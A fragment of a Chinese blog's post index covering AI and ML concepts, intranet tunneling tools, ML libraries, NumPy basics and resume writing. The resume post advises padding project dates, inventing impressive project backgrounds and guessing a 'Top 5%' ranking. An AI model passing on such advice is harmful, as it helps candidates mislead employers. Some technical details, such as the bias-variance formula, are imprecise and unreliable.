Se-dol时，媒体描述这场人机对战的时候，提到了人工智能AI、机器学习、深度学习等术语。没错，这三项技术都为AlphaGo的胜利立下了汗马功劳，然而它们并不是一回事。 人工智能和机器学习的同时出现，机器学习和深度学习的交替使用……使大部分读者雾里看花，这些概念究竟有何区别，我们可以通过下面一个关系图来进行区分。 图一：人工智能、机器学习、深度学习的关系 人工智能包括了机器学习和深度学习，机器学习包括了深度学习。人工智能是机器学习的父类，机器学习则是深度学习的父类。 人工智能（Artificial Intelligence，AI）是计算机科学的一个分支，它企图了解智能的实质，并生产出一种新的与人类智能相似的方式作出反应的智能机器，它不是人的智能，但能像人那样思考、也可能超过人的智能。 人工智能实际应用：机器视觉，指纹识别，人脸识别，视网膜识别，虹膜识别，掌纹识别，专家系统，自动规划，智能搜索，定理证明，博弈，自动程序设计，智能控制，机器人学，语言和图像理解，遗传编程等。人工智能目前也分为：强人工智能(BOTTOM-UPAI)和弱人工智能(TOP-DOWNAI)。 机器学习（Machine Learning，ML）是人工智能的核心，属于人工智能的一个分支。机器学习是指从数据中自动分析获得规律，并利用规律对未知数据进行预测的算法，所以机器学习的核心是数据、算法（模型）、算力（计算机运算能力）。 机器学习应用领域：数据挖掘、数据分类、计算机视觉、自然语言处理(NLP)、生物特征识别、搜索引擎、医学诊断、检测信用卡欺诈、证券市场分析、DNA序列测序、语音和手写识别、战略游戏和机器人运用等。 深度学习（Deep Learning，DL）：是机器学习研究中的一个新的领域，其动机在于建立、模拟人脑进行分析学习的神经网络，它模仿人脑的机制来解释数据。 数据挖掘（Data Mining，DM），顾名思义是指利用机器学习技术从海量数据中“挖掘”隐藏信息，主要应用于图像、声音、文本。在商业环境中，企业希望让存放在数据库中的数据能“说话”，支持决策。所以数据挖掘更偏向于应用。 图二：数据挖掘与机器学习的关系 机器学习是数据挖掘的一种重要方法，但机器学习是另一门学科，并不从属于数据挖掘，二者相辅相成。数据挖掘是机器学习和数据库的交叉，主要利用机器学习提供的技术来分析海量数据，利用数据库界提供的技术来管理海量数据。 不管是人工智能、机器学习、深度学习还是数据挖掘，目前都在解决共同目标时发挥了自己的优势，并为社会生产和人类生活提供便利，帮助我们探索过去、展示现状、预测未来。","link":"/2019/09/29/人工智能，机器学习，数据挖掘/"},{"title":"内网穿透工具","text":"概述 如何让任何地方都能访问自己家里的笔记本上的应用？ 如何让局域网的服务器可以被任何地方访问到？ 有很多类似的需求，我们可以统一用一个解决方案：内网穿透。下面介绍几种常用的内网穿透方式，从此旧电脑不再变废柴。 几种方式Ngrok简介：一个通过任何NAT或防火墙为您的本地主机服务器提供即时访问、安全的URL的命令。类似花生壳，分为服务端和客户端，也可以自己搭建服务端。 工具主页：https://ngrok.com/ autossh简介：autossh是一个程序，用于启动ssh的副本并进行监控，在死亡或停止传输流量时根据需要重新启动它。这个想法来自rstunnel（Reliable SSH Tunnel），但是在C中实现。作者的观点是，它不像匆匆忙忙的工作那么容易。使用端口转发环路或远程回显服务进行连接监视。在遇到连接拒绝等快速故障时，关闭连接尝试的速度。在OpenBSD，Linux，Solaris，Mac OS X，Cygwin和AIX上编译和测试; 应该在其他BSD上工作。免费软件。 工具主页：http://www.harding.motd.ca/autossh/ Natapp简介：基于ngrok的国内收费内网穿透工具，类似花生壳，有免费版本，比花生壳好。免费版本：提供http,https,tcp全隧道穿透，随机域名/TCP端口，不定时强制更换域名/端口，自定义本地端口 工具主页：https://natapp.cn/ Frp简介：frp 是一个可用于内网穿透的高性能的反向代理应用，支持 tcp, udp, http, https 协议。利用处于内网或防火墙后的机器，对外网环境提供 http 或 https 服务。对于 http, https 服务支持基于域名的虚拟主机，支持自定义域名绑定，使多个域名可以共用一个80端口。利用处于内网或防火墙后的机器，对外网环境提供 tcp 和 udp 服务，例如在家里通过 ssh 访问处于公司内网环境内的主机。 工具主页：https://github.com/fatedier/frp Lanproxy简介：lanproxy是一个将局域网个人电脑、服务器代理到公网的内网穿透工具，目前仅支持tcp流量转发，可支持任何tcp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面…）。目前市面上提供类似服务的有花生壳、TeamView、GoToMyCloud等等，但要使用第三方的公网服务器就必须为第三方付费，并且这些服务都有各种各样的限制，此外，由于数据包会流经第三方，因此对数据安全也是一大隐患。 工具主页：https://github.com/ffay/lanproxy Spike简介：Spike是一个可以用来将你的内网服务暴露在公网的快速的反向代理，基于ReactPHP，采用IO多路复用模型。采用php实现。 工具主页：https://github.com/slince/spike 花生壳简介：商业化比较成功的内网穿透。个人开发很不推荐，收费贵，企业可以考虑使用。 工具主页：https://hsk.oray.com/","link":"/2019/09/29/内网穿透工具/"},{"title":"机器学习开源工具","text":"从事机器学习方面的工作，不会用工具将极大地阻碍工作效率。但现在工具那么多，我们该如何选择呢？本文针对非开发者、模型部署、NLP、语音、视觉、强化学习、数据挖掘等多个不同人群，提供了10个必须掌握的模型。 在厦门人工智能峰会上，依图科技联合创始人、CEO朱珑介绍到短短的5年时间机器的算法水平又提升了100万倍！过去或许只能从1万人中识别出1个人，后来发展到1000万、1亿、10亿甚至20亿人中识别出这个人！与此同时，算力方面提升了10万倍。从过去用1万量级规模的数据做训练，到百万规模的数据做训练，到现在用10亿的数据集做训练，又提升了1万倍！ 我们已经深刻地体会到，人工智能的飞速增长刺激了当今就业市场对机器学习技能的巨大需求。机器学习社区现在非常活跃，各种开源工具层出不穷，让人有点目不暇接，有点不知道该如何选择。那么本篇将为你介绍10个最应该了解的机器学习开源工具，走起！ 非开发者应该用什么？不会开发，不会编程，也能用机器学习？答案是可以的，只要你会用工具。这里为初学者推荐两个工具： KnimeKnime是一款出色的工具，可让你无需编写任何代码即可完成端到端的数据科学工作流程。 它甚至配备了一个拖放式界面，UI清晰，操作简单直观，可以说是懒人福音了。 操作起来非常简单，首先使用该工具进行数据收集和转换；完成后，你可以创建一个模型并将其可视化。在生产方面，你可以部署和管理数据科学项目。 最后，你可以通过使用Knime生成洞察来利用你的实现。 官网：https://www.knime.com/ Uber LudwigUber Ludwig是另一款适合初学者的优秀工具。有了它，你可以快速测试和训练深度学习模型。用户可以选择启用懒人模式（拖拽界面），或者直接操作代码。 使用起来比Knime稍微复杂一点点。需要先加载CSV文件来训练数据。通过使用预先训练的模型，你可以预测输出目标。最后，你可以使用可用的可视化选项可视化你的数据。 如果你是编程的初学者，你还可以在Python中使用他们扩展的API和训练模型。 GitHub地址：https://uber.github.io/ludwig/user_guide/ 模型部署用什么工具？模型部署是机器学习的关键方面之一。为了帮助你完成此过程，这里列出了几个工具。 TensorFlow.jsTensorFlow.js允许你直接从Web构建和部署机器学习模型。它使用JavaScript在Web上运行。 你也可以使用Node.js。有了它，你不仅可以运行现有模型，还可以重新训练现有模型。 它提供了直观的API，允许你使用JavaScript构建和训练模型，在Web浏览器上也是如此。 如果你想在移动设备上进行开发，还可以查看TensorFlow Lite。 官方地址：https://www.tensorflow.org/js/ MLFlowMLFlow让你可以解决端到端的机器学习生命周期问题。它有三个主要组件。 MLflow跟踪 - 通过记录和比较结果和参数来处理实验MLflow项目 - 允许你将项目打包成其他成员的可重用表单MLflow模型 - 帮助你在不同平台中部署和管理ML库 MLFlow的另一个惊人功能是它与库无关。这意味着你可以将其与其他机器学习库一起使用而不会出现任何兼容性问题。为了实现library-agonistic行为，它使用REST API和CLI。 官方地址：https://github.com/databricks/mlflow NLP、计算机视觉和音频用什么工具？还有其他方便的工具可用于在机器学习中执行不同的操作。 Detectron如果你正在寻找最先进的物体检测算法，那么你可以使用Detectron。 它由Facebook开发，是AI Research软件系统的一部分。它利用Caffe2深度学习框架和Python。 官方地址：https://github.com/facebookresearch/Detectron SimpleCVSimpleCV，一个开源框架，允许你构建计算机视觉应用程序。它类似于OpenCV，使你可以访问高级计算机视觉库。这意味着你不必担心错综复杂的概念。 有了它，你可以制作计算机视觉项目，而无需在基础知识上投入太多时间。毕竟，出于某种原因，它被命名为SimpleCV。 官方地址：http://simplecv.org/ Tesseract OCRTesseract OCR是一款功能强大的光学字符识别软件，可让你识别语言。 它支持100多种语言，也可以编程识别新语言。 官方地址：https://github.com/tesseract-ocr/tesseract 强化学习用什么工具？如果你想训练智能体，那么你需要帮助强化学习。 Open AI GymOpen AI Gym让你训练你的智能体做几乎任何事情，包括散步、玩游戏等等。它借助易于使用的强化学习任务套件来实现。 官方地址：https://gym.openai.com/ Unity ML AgentsUnity ML Agents是Unity提供的开源统一插件，让你开发可在游戏中使用的智能体。 官方网址：https://unity3d.com/machine-learninghttps://unity3d.com/machine-learning 数据挖掘用什么工具？如果你希望收集数据科学项目的数据，可以使用以下工具。 WekaWeka用于数据挖掘任务。它借助于为数据挖掘设计的机器学习算法来实现。有了它，你可以找到很多东西，包括分类、准备、回归、聚类、可视化和关联规则挖掘。 该项目是开源的，使用GNU许可。 官方网址：http://www.cs.waikato.ac.nz/ml/weka/ 结论机器学习正在改变我们与世界互动的方式。它使我们的生活更轻松，并确保我们建立一个未来世界。","link":"/2019/09/29/机器学习开源工具/"},{"title":"python常用包介绍","text":"Python的常用包有哪些，分别有什么作用？Python常用包1、Numpy（数值运算库） 2、Scipy（科学计算库） 3、Matplotlib（基础可视化库） 4、Pandas（数据处理库） 5、Seaborn（高级可视化库） 6、Scikit-learn（流行的机器学习库） 各自作用1、Numpy是最为流行的机器学习和数据科学包，Numpy包支持在多维数据上的数学运算，提供数据结构以及相应高效的处理函数，很多更高级的扩展库(包括Scipy、Matplotlib、Pandas等库）都依赖于Numpy库； 2、Scipy包用于科学计算，提供矩阵支持，以及矩阵相关的数值计算模块，其功能包含有最优化、线性代数、积分、插值、拟合、信号处理和图像处理以及其他科学工程中常用的计算； 3、Pandas用于管理数据集，强大、灵活的数据分析和探索工具，其带有丰富的数据处理函数，支持序列分析功能，支持灵活处理缺失数据等； ● Pandas基本的数据结构是Series和DataFrame； ● Series就是序列，类似一维数组； ● DataFrame相当于一张二维的表格，类似二维数组，它的每一列都是一个Series； ● 为了定位Series中的元素，Pandas提供了Index对象，每个Series都会带有一个对应的Index，用来标记不用的元素； ● DataFrame相当于多个带有同样Index的Series的组合（本质是Series的容器）； 4、Matplotlib库用于数据可视化，强大的数据可视化工具以及作图库，其主要用于二维绘图，也可以进行简单的三维绘图； 5、Seaborn库是基于Matplotlib的高级可视化库； 6、Sklearn库包含大量机器学习算法的实现，其提供了完善的机器学习工具箱，支持预处理、回归、分类、聚类、降维、预测和模型分析等强大的机器学习库，近乎一半的机器学习和数据科学项目使用该包。 sklearn的常用包有哪些，分别有什么作用？sklearn库的结构sklearn主要是用于机器学习，所以sklearn的模块也都是围绕机器学习算法的。sklearn因此可以分为这几个部分：Classification（分类），Regression（回归），Clustering（聚类），Dimensionality reduction（降维），Model selection（模型选择），Preprocessing（预处理）。 1.分类算法包括SVM（sklearn.svm.SVC等）、近邻（sklearn.neighbors）、随机森林（sklearn.ensemble.RandomForestClassifier）等。 2.回归算法包括SVR（sklearn.svm.SVR）、岭回归（sklearn.linear_model.Ridge）、Lasso（sklearn.linear_model.Lasso）等。 3.聚类算法包括K均值（sklearn.cluster.KMeans）、谱聚类（sklearn.cluster.SpectralClustering）等。 4.降维算法包括PCA（如sklearn.decomposition.PCA）、特征选择（sklearn.feature_selection，包括单变量特征选择等）、非负矩阵分解（如sklearn.decomposition.NMF、LatentDirichletAllocation）。 5.模型选择方法包括网格搜索（sklearn.model_selection.GridSearchCV）、交叉验证（有很多，比如sklearn.model_selection.KFold、cross_val_score）、评估指标（sklearn.model_selection.metrics，包括precision、recall、accuracy等）。 6.预处理方法包括基本的预处理方法（sklearn.preprocessing，包括标准化、类别化、离散化等）、特征抽取（sklearn.feature_extraction，包括文本特征抽取方法bag of words、tf-idf等）。 机器学习主要步骤中sklearn应用1.数据集：sklearn.datasets中提供了很多数据集，初学时可将其作为基础数据。 2.数据预处理：sklearn.preprocessing，包括：降维、数据归一化、特征提取和特征转换（one-hot）等 3.选择模型并训练：分类、回归、聚类、集成等算法，涉及的模型主要是sklearn.linear_model、sklearn.cluster、sklearn.ensemble。 4.模型评分：sklearn.metrics，包括准确率、召回率等，算法自身也带有评分方法score。 5.模型的保存与恢复：可以用python的pickle方法（pickle.dump、pickle.load），或者sklearn.externals.joblib（joblib.dump、joblib.load）。 什么是正则化、如何理解正则化以及正则化的作用？正则化-Regularization（也称为惩罚项或范数）就是通过对模型的参数在“数量”和“大小”方面做相应的调整，从而降低模型的复杂度，以达到避免过拟合的效果。 如何理解正则化如果我们的目标仅仅是最小化损失函数（即经验风险最小化），那么模型的复杂度势必会影响到模型的整体性能；引入正则化（即结构风险最小化）可以理解为衡量模型的复杂度，同时结合经验风险最小化，进一步训练优化算法。 正则化的作用正则化可以限制模型的复杂度，从而尽量避免过拟合的发生；模型之所以出现过拟合的主要原因是学习到了过多噪声，即模型过于复杂（也可以通过简化模型或增加数据集等方法尽量避免过拟合的发生）。 正则化的常见类型:（1）L1正则化 可以通过稀疏化（减少参数“数量”）来降低模型复杂度的，即可以将参数值减小到0。 （2）L2正则化 可以通过减少参数值“大小”来降低模型的复杂度，即只能将参数值不断减小，但永远不会减小为0，只能尽量接近于0。 关联概念过拟合、正则化、经验风险最小化、结构风险最小化、损失函数、模型复杂度、范数 bias和variance是什么？解释1bias 偏差 ：模型的期望（或平均）预测和正确值之间的差别； variance 方差 ：模型之间的多个拟合预测之间的偏离程度。 解释2bias和variance分别从两个方面来描述了我们学习到的模型与真实模型之间的差距； bias是 “用所有可能的训练数据集训练出的所有模型的输出的平均值” 与 “真实模型”的输出值之间的差异； variance则是“不同的训练数据集训练出的模型”的输出值之间的差异。 解释3首先 Error = bias + variance Error反映的是整个模型的准确度，bias反映的是模型在样本上的输出与真实值之间的误差，即模型本身的精准度，variance反映的是模型每一次输出结果与模型输出期望之间的误差，即模型的稳定性； 更准确地讲Error分成3个部分：Error = bias + variance + noise;","link":"/2019/09/29/python常用包介绍/"},{"title":"简历制作","text":"越长大越孤单 简历制作一演示: 简历制作二演示: 简历制作三演示: 简历制作四演示: 简历制作五演示:","link":"/2019/09/29/简历制作/"},{"title":"打造一份优雅的简历","text":"正所谓是金九银十，希望这个简历对所有人有所帮助。 另外，简历的制作其实并不是一蹴而就的事，当你知道了写简历的套路，平时就会有意识的积累素材，所以什么时候都可以学习如何打造一份优雅的简历。 简历是什么？在我看来，在面试之前，直接代表你这个人。虽然简历不会说话，但是简历的内容会让面试官直接在脑海里勾勒出你的形象。如果简历排版非常精致，你就会被塑造成一位细心、得体的形象；反之，如果简历里出现了错别字，那粗心这个标签就会打到你身上了。 所以，对待简历一定要重视！它是找工作过程中的第一道关卡，过了这一关，才有在面试中展示自我的机会。当然，平时的积累，个人的真实水平，临场发挥、人脉、运气也都很重要。这篇文章假设那些因素大家都一样，只比拼简历，就看谁简历写得好。 好的简历就是你的名片，不好的简历可能就是你的黑历史。接下来我们进入正题，说说简历该怎么写。 先贴一份完成了的简历。为了不暴露隐私，简历中的信息都是虚构的，但是写法都是按照模板来的，所以仍然不失一份精彩的样例，可以细看研究的。 顺便说一句，这张图片，可以自由传播。如果你仔细研究一下简历中的三个项目，你肯定会被我的才华折服的。 接下来就按简历模板里各个板块的顺序，详细解释每个部分该怎么写。 抬头直接写名字，电话号码，邮箱，其他信息不用填写。 找工作的时候最好在手机号码后面还留个座机号码，防止联系不上，这是细节。 关于电子邮箱，校招的同学可以留学校的邮箱；对于社招，gmail.com，163.com，foxmail.com 都不错，qq.com 也是可以的，只是需要把邮箱前缀改成一些有意义的，例如姓名的缩写之类的，这在邮箱设置里直接设置就好了，一定不要出现一些“中二”的邮箱名，例如“今夜无眠”之类的绝对不要出现。 有些同学问，需不需要挂个相片上去？其实，在抬头右侧空白部分，是可以挂上的。但是，我建议男生一率不要挂照片（当然如果你有吴彦祖的风彩当我没说），女生可以适当挂上证件照，前提是颜值是你的一大优势。 当然，一些国企事业单位会强制要求你贴上照片，那就贴好了。但也不要随便找一个白拍照就放上去了，找一家正规的照相馆，化好妆，照片精修后的效果肯定可以提高你在面试官那里的第一印象，这是好的开始。 教育背景这块直接从最高学历写起，写到本科即可。包括时间，学位，学校，专业，排名这些信息。有些可以体现你实力的东西是可以备注上的，例如优秀毕业生，免试推荐研究生，这些是可以在挂号里备注上的。 有些人说，这样是不是太高调了？借用 caoz 的一句话：你矜持，你活该。 最后，关于排名，如果你是专业第一名，就直接写上；否则，就计算一下你的排名大概占比百分之多少。如果班级排名高，就按班级的排名来，如果学校排名高，就写学校的排名。总之，按最高的来写。研究生一般没有排名这个说法，那你就估个数好了，填上 Top 5%，一般没有问题。 这里教大家一个小技巧，你看前面贴出来的简历是不是排列得很整齐？让你自己动手做，你不一定排得这么整齐。教你一招： 通过表格，能自动地让文字对齐。写完之后，只需要将表格的边框设置为不可见就行了！深藏功与名！隐藏表格边框后的效果是这样的： 有没有惊艳到？如果你早就知道了这个技巧，当我没说。 工作经历如实写就好了，校招同学这一项可以写下实习经历，如果没有实习，这一项整体就不要了。社招同学不要在这上面弄虚作假，因为社招入职都会做尽调，被查出不诚信就尴尬了。 同样，可以用到上面提到的用表格排版的小技巧。 项目经历找互联网工作的同学，一定刷过《剑指 offer》这本书，书里面的题在面试过程中出场率还是挺高的。但是，很多同学都只看了其中的题目部分，对于前两章可能就略读了，甚至直接跳过去了。其实，书的前两章是讲如何面试的，同样写得很精彩，值得细细研究。 咱们这篇文章不说面试，只说简历。但书里面有一个非常好的点 —— 描述项目的 STAR 模型： 项目经历这一项按照这个模型来写就 OK 了。 先简述项目背景，为什么要做它，要简短、清晰，也就是 Situation； 再来说你负责哪一块，做了哪些有价值的工作，这一块要学会提炼，不能是简单的工作罗列，尽量让人觉得这是有技术含量的，包含 Task&amp;Action； 最后，就是这件事完成的效果如何，是性能提升了 100 倍还是从零到一完成了某个复杂的系统，关键在于你要用数字来表达。例如，我经过一系列的优化过程，使得系统响应时间缩短为原来的 50%，或者说响应时间提升 1 倍，平均响应时间达到 1 ms 等等。 举个例子来说： 最开始一行，项目的简要信息。首先 项目的起止时间，这个要斟酌一下，太长显得效率太低，太短可能又显得不深入。不是要教大家不诚信，这块适当“优化”下没太大问题；然后是 地点，可以是学校，也可以是公司，照实写；接着是 项目名，简短、清晰；最后是你的 角色，一般可以写项目总负责人，核心参与者，项目主导者等等，不要太浮夸，也不要太低下。 接着，项目介绍。主要是讲清楚你做这个事的背景是什么。注意，不能说“这是实验室项目要求”或者“老师指定我做的”，要写这个项目的背景，业界是个什么进展，本项目它能解决什么问题，价值在哪，这是应该写的。有些项目确实垃圾，但编也得编一个高大上的介绍，毕竟它代表了你的水平不是嘛？ 接着，个人职责。先是概要的一句话，例如负责系统的整体架构，打上一个句号，这是总起，后面用更细致的话来解释。例如，充分调研市面上的相关系统，反复设计修改，设计出一套高可用、高性能、可扩展的系统架构。一般要列三点，多了太长，少了显得工作量少。所以，要挑选最重要的点来说，例如，设计并实现了某个算法，性能是之前的多少倍。 最后，项目成果。这块一定要挑最亮点的来说，而且一定要能用数字量化。常见的就是性能提升了多少倍，支持了多少并发，支持了多少用户，不可用时长为 0，发表文章专利多少篇…… 重要词语、数字用加粗来突出显示。这些加粗就是你最擅长的点，也是面试官可能会问你。所以你想让他问你什么，就加粗吧！ 个人技能这一项比较好搞定，把你的技能罗列出来，注意是和工作相关的。你找互联网的工作，写上一句“熟悉 office 的操作”就不太合适了吧。可以写：熟练掌握常见的数据结构和算法，熟悉 C/C++，熟悉 mysql/codis/etcd/zookper…… 英语听说读写能力也可以写上，例如“能熟练进行英文的听说读写”。 唯一需要注意的是，不要也不能写“精通”。“精通”是一个非常强的词，很少人能做到。这里并不是谦虚的问题，还涉及到一个预期管理的问题，也就是面对“精通”和“熟悉”，面试官对你的期待是不一样的。 如果你写上“熟悉 Golang”，那么当面试官问你一个比较深入的问题时（例如 Golang 的 map 是怎么进行扩容的），你答上来了，他会觉得你水平比较高，而且还很谦虚。相反，你写的是“精通 Golang”，面试过程中，只要有一个问题没答上，那是不是一下子印象就下去了？ 还写人写“精通 C/C++”，要知道，就是 C++ 的作者，他也不能完全掌握 C++ 的特性啊，即使 C++ 编译器，也不是所有的特性它都支持。换句话说，即使是编译器，也不能说它精通 C++。 个人评价这一栏，可以展示你在工作技能之外的特性。例如，我看到有师兄这样写： 高中班主任这样评价我：你是一个严于律己的人，一个精诚团结的人，一个志向远大的人。 面试官可能会问：班主任为什么要这么评价？这时，他就掉入你提前挖好的“坑”，因为一个可以展示你优秀品质的故事正在等着他，这是你提前准备的已经演练了无数遍了。而且，面试进程也在你的掌握之中了。 注意，不要太多，也不要太浮夸，着重展示你是一个可以合作，善于沟通，工作积极的人。 其他事项这块说一下其他未尽事项。 校招简历一般只要一页，就算你有再多内容要写，也只能压缩到一页，把那些最重要的，最能展示你能力的那部分内容保留下来，其他的干掉。 社招简历也不要超过两页，这样显得简练，展示的也都是高质量的项目，不能是简单的罗列，要总结升华。这样也可以打印到一页纸上，方便面试官，也就是方便你自己。 工作中，有一项非常重要的能力就是总结、提炼、升华。可能实验室的项目是一些企业的横向项目，就是 1+1=2 的事，非常简单，可能你觉得没啥可写的。这就是你发挥能力的时候了，从这些日常操作中，总结出一些高大上的东西来。如果不会，多参考一下优秀学长学姐的简历。 总之，你写到简历上的项目一定是经过总结升华的，这需要经过你无数次的修改。 还有一点要注意的是，发给别人的简历一定要是 pdf 格式，有些同学直接把 word 版 丟给别人，不同软件版本的电脑上可能会有兼容性问题啊，可能会有乱码，而且 word 版可能会被篡改。另外，打印简历的时候，也是要用 pdf 版本，不会出问题。 简历文件命名也是一个要注意的点。一般用 “码农桃花源-桃花源工作室-18888888888”，也就是“姓名-学校/公司-手机”这样的格式。这样，方便 HR 或者面试官联系你，因为只看文件名就能知道你的联系方式，和一些最重要的信息。再说一次，方便面试官就是方便你自己。 还有一个点，针对不同职位的简历应该是不一样的。这时，你可以把你的项目进行组合，不同职位的简历对应不同的项目组合，有的放矢。有些人会用 git 的不同分支维护不同的简历版本。 总结简历是你的代表，无声代表你这个人；它也是一个面试索引，能引导面试官的提问。所以如果你特别擅长某个方面，一定要在简历上突出。这相当于给面试官“挖坑”，如果他进坑了，那问的问题一定要你早就烂熟于心的，因为那是你准备无数遍的精彩故事、优化案例。 这样，面试官整个过程都是受你的引导，在你的框框里，不知不觉，在你讲述你擅长内容的过程中，面试进程被你掌握了。面试官接下来的问题，也会是围绕你的回答、故事展开。 简历模板: 你可以去Download 下载简历模板或者是去简历制作","link":"/2019/09/29/打造一份优雅的简历/"},{"title":"初识Numpy","text":"Numpy简介NumPy 是 Numerical Python 的简称，它是 Python 中的科学计算基本软件包。NumPy 为 Python 提供了大量数学库，使我们能够高效地进行数字计算。更多可点击Numpy官网 查看。 关于Numpy需要知道的几点： NumPy 数组在创建时有固定的大小，不同于Python列表（可以动态增长）。更改ndarray的大小将创建一个新的数组并删除原始数据。 NumPy 数组中的元素都需要具有相同的数据类型，因此在存储器中将具有相同的大小。数组的元素如果也是数组（可以是 Python 的原生 array，也可以是 ndarray）的情况下，则构成了多维数组。 NumPy 数组便于对大量数据进行高级数学和其他类型的操作。通常，这样的操作比使用Python的内置序列可能更有效和更少的代码执行。 所以，Numpy 的核心是ndarray对象，这个对象封装了同质数据类型的n维数组。起名 ndarray 的原因就是因为是 n-dimension-array 的简写。接下来本节所有的课程都是围绕着ndarray来讲的，理论知识较少，代码量较多，所以大家在学习的时候，多自己动动手，尝试自己去运行一下代码。 创建ndarray 由python list创建 1234567891011121314151617181920212223242526# 1维数组a = np.array([1, 2, 3]) print(type(a), a.shape, a[0], a[1], a[2])out:&lt;class 'numpy.ndarray'&gt; (3,) 1 2 3# 重新赋值a[0] = 5 print(a)out:[5 2 3]# 2维数组b = np.array([[1,2,3],[4,5,6]]) print(b)out:[[1 2 3] [4 5 6]]print(b[0, 0], b[0, 1], b[1, 0])out:1 2 4 由numpy内置函数创建 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104# 创建2x2的全0数组a = np.zeros((2,2)) print(a)out:[[ 0. 0.] [ 0. 0.]] # 创建1x2的全1数组b = np.ones((1,2)) print(b)out:[[ 1. 1.]]# 创建2x2定值为7的数组c = np.full((2,2), 7) print(c)out:[[7 7] [7 7]]# 创建2x2的单位矩阵（对角元素为1）d = np.eye(2) print(d)out:[[ 1. 0.] [ 0. 1.]]#创建一个对角线为10,20,30,50的对角矩阵d_1 = np.diag([10,20,30,50]) print(d_1)out:[[10 0 0 0] [ 0 20 0 0] [ 0 0 30 0] [ 0 0 0 50]]#创建一个一维的0-14的数组e = np.arange(15) print(e)out:[ 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14]#创建一个一维的4-9的数组e_1 = np.arange(4,10) print(e_1)out:[4 5 6 7 8 9]#创建一个一维的1-13且以间隔为3的数组e_2 = np.arange(1,14,3) print(e_2)out:[ 1 4 7 10 13]#创建一个一维的范围在0-10，长度为6的数组f = np.linspace(0,10,6) print(f)out:#各个元素的间隔相等，为(10-0)/(6-1) = 2，若不想包含末尾的10，可以添加参数endpoint = False[ 0., 2., 4., 6., 8., 10.] #把arange创建的一维数组转换为3行4列的二维数组g = np.arange(12).reshape(3,4) print(g) out:#注意：使用reshape转换前后的数据量应该相同，12 = 3x4[[ 0, 1, 2, 3], [ 4, 5, 6, 7], [ 8, 9, 10, 11]] # 2x2的随机数组(矩阵),取值范围在[0.0,1.0)（包含0，不包含1）h = np.random.random((2,2)) print(e)out:[[ 0.72776966 0.94164821] [ 0.04652655 0.2316599 ]]#创建一个取值范围在[4,15)，2行2列的随机整数矩阵i = np.random.randint(4,15,size = (2,2)) print(i)out:[[6, 5], [5, 9]]#创建一个从均值为0，标准差为0.1的正态分布中随机抽样的3x3矩阵j = np.random.normal(0,0.1,size = (3,3)) print(j)out:[[-0.20783767, -0.12406401, -0.11775284], [ 0.02037018, 0.02898423, -0.02548213], [-0.0149878 , 0.05277648, 0.08332239]] 访问、删除、增加ndarray中的元素这里主要是提供了一些访问、更改或增加ndarray中某一元素的基础方法。 访问&amp;修改类似于访问python list中元素的方式，按照元素的index进行访问或更改。 123456789101112131415161718#访问某一元素，这里可以自己多尝试#访问一维数组的某一元素，中括号内填写indexprint(np.arange(6)[3]) out:3#访问二维数组的某一元素，中括号内填写[行,列]print(np.arange(6).reshape(3,2)[1,1]) out:3#访问三位数组中的某一元素，中括号内[组，行，列]print(np.arange(12).reshape(2,3,2)[0,1,1]) out:3#更改某一元素，用 = 进行赋值和替换即可a = np.arange(6)a[3] = 7 #先访问，再重新赋值print(a)[0 1 2 7 4 5] 删除可使用np.delete(ndarray, elements, axis)函数进行删除操作。 这里需要注意的是axis这个参数，在2维数据中，axis = 0表示选择行，axis = 1表示选择列，但不能机械的认为0就表示行，1就表示列，注意前提2维数据中。 在三维数据中，axis = 0表示组，1表示行，2表示列。这是为什么呢？提示一下，三位数组的shape中组、行和列是怎样排序的？ 所以，axis的赋值一定要考虑数组的shape。 123a = np.arange(12).reshape(2,2,3)#思考下，这里删除axis = 0下的第0个，会是什么结果呢？自己试一下print(np.delete(a,[0],axis = 0)) 再有一点需要注意的是，如果你想让原数据保留删除后的结果，需要重新赋值一下才可以。 1234567891011a = np.arange(6).reshape(2,3)np.delete(a,[0],axis = 0)print(a)array([[0, 1, 2], [3, 4, 5]]) #原数据并未更改a = np.delete(a,[0],axis = 0) #重新赋值print(a)array([[3, 4, 5]]) #原数据已更改 增加往ndarray中增加元素的办法跟python list也很类似，常用的有两种： 一种是添加（append），就是将新增的元素添加到ndarray的尾部 语法为：np.append(ndarray, elements, axis) 参数和delete函数一致，用法也一致，这里不再赘述 一种是插入（insert），可以让新增元素插入到指定位置 语法为：np.insert(ndarray, index, elements, axis) 参数中就多了一个index，指示的是插入新元素的位置。 这里值得注意的是，不论是append还是insert，在往多维数组中插入元素时，一定要注意对应axis上的shape要一致。再一个就是，和delete一样，如果你想要更改原数据，需要重新赋值。 切片和筛选ndarray切片前面学了选择ndarray中的某个元素的方法，这里我们学习获取ndarray子集的方法——切片。 对于切片大家并不陌生，在list里面我们也接触过切片，一维的ndarray切片与list无异。需要注意的是，就是理解2维及多维ndarray切片。 2维矩阵切片 12345678910111213141516a = np.arange(4*4).reshape(4,4)print(a)out:array([[ 0, 1, 2, 3], [ 4, 5, 6, 7], [ 8, 9, 10, 11], [12, 13, 14, 15]])a[:,:-1]out:array([[ 0, 1, 2], [ 4, 5, 6], [ 8, 9, 10], [12, 13, 14]]) 这里可以看出，我们筛选了a矩阵中前三列的所有行，这是如何实现的呢？ 切片的第一个元素:表示的是选择所有行，第二个元素:-1表示的是从第0列至最后一列（不包含），所以结果如上所示。 再看一个例子： 12345a[1:3,:]out:array([[ 4, 5, 6, 7], [ 8, 9, 10, 11]]) 筛选的是第2-3行的所有列。 一个常用的切片 以列的形式获取最后一列数据： 1234567a[:,3:]out:array([[ 3], [ 7], [11], [15]]) 以一维数组的形式获取最后一列数据： 1234a[:,-1]out:array([ 3, 7, 11, 15]) 上面两种方法经常会用到，前者的shape为(4,1)，后者为(4,)。 ndarray筛选 选择ndarray的对角线 所用函数为np.diag(ndarray, k=N)，其中参数k的取值决定了按照哪一条对角线选择数据。 默认k = 0，取主对角线； k = 1时，取主对角线上面1行的元素； k = -1时，取主对角线下面1行的元素。 思考：这个函数只能选择主对角线上的元素，那如果想要获取副对角线上的元素呢？ 尝试自己搜索一下关键词numpy opposite diagonal寻找答案。 不建议你直接点getting the opposite diagonal of a numpy array。 提取ndarray中的唯一值 所用函数为np.unique(ndarray)，注意unique也可以添加参数axis来控制评判唯一值的轴方向，不好理解可以看示例： 123456789101112131415161718192021#查看二维数组a中的唯一值a = [[0,1,2], [3,4,5], 